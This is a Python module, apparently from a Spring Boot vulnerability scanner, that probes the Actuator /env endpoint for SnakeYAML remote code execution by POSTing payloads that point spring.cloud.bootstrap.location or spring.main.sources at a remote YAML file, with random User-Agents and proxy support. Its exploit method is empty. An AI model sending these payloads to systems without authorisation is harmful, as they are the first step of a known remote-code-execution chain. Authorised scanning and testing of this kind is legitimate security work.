# coding:utf-8

import aiohttp
from util import RandomUA

class SnakeYAML_RCE_Async:
    def __init__(self):
        ua = RandomUA.RandomUA()
        self.ua = ua.UserAgent()
        self.Headers_1 = {
            "User-Agent": self.ua,
            "Content-Type": "application/x-www-form-urlencoded"
        }
        self.Headers_2 = {
            "User-Agent": self.ua,
            "Content-Type": "application/json"
        }
        self.payload_1 = "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
        self.payload_2 = "{\"name\":\"spring.main.sources\",\"value\":\"http://127.0.0.1/example.yml\"}"
        self.path = 'env'

    async def fetch(self, session, url, path, headers, payload, proxies):
        try:
            async with session.post(url=url + path, headers=headers, data=payload, timeout=6, allow_redirects=False,
                                    verify_ssl=False, proxies=proxies) as response:
                return await response.text(), response.status
        except Exception as e:
            return str(e), 0

    async def poc(self, url, proxies, ProxyStute):
        if ProxyStute == 1:
            proxy = proxies
        else:
            proxy = None
        try:
            async with aiohttp.ClientSession() as session:
                urltest = url + self.path

                text1, _ = await self.fetch(session, urltest, "", self.Headers_1, self.payload_1, proxy)
                text2, _ = await self.fetch(session, urltest, "", self.Headers_2, self.payload_2, proxy)

                if 'example.yml' in text1:
                    result1 = "[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x\n"
                    result2 = f"漏洞存在路径为 {urltest}\n"
                    result3 = f"'POST数据包内容为 {self.payload_1}"
                    return result1 + result2 + result3
                elif 'example.yml' in text2:
                    result1 = "[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x\n"
                    result2 = f"漏洞存在路径为 {urltest}\n"
                    result3 = f"'POST数据包内容为 {self.payload_2}"
                    return result1 + result2 + result3
                else:
                    result = f"[-] {urltest}未发现SnakeYAML-RCE漏洞"
                    return result
        except Exception as e:
            error = f"[error] {url} 未知错误 {e}"
            return error

    async def exp(self, url, proxies, ProxyStute):
        pass